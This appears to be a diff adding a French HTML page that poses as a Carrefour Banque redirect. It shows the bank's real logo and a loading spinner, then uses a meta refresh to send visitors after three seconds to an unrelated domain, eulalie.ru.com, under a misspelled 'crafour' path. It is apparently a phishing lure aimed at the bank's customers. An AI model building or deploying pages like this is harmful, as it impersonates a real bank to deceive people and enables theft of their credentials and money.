@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="3;url=https://eulalie.ru.com/crafour/">
+    <title>Redirection vers Carrefour Banque</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+        }
+        .logo-container {
+            margin-bottom: 40px;
+        }
+        .logo-container img {
+            max-width: 300px;
+            height: auto;
+        }
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .loading-circle {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #003087; /* Bleu foncé Carrefour */
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        .loading-text {
+            color: #333;
+            font-size: 18px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="logo-container">
+        <!-- Remplacez par le vrai logo Carrefour Banque -->
+        <img src="https://static-cms.carrefour.fr/sites/default/files/2022-05/LOGOS%20SERVICES_CRF%20BANQUE%20ASSURANCE.jpg?itok=HiYlDTOB" alt="Carrefour Banque Logo">
+    </div>
+    
+    <div class="loading-container">
+        <div class="loading-circle"></div>
+        <p class="loading-text">Redirection en cours vers Carrefour Banque...</p>
+    </div>
+</body>
+</html>
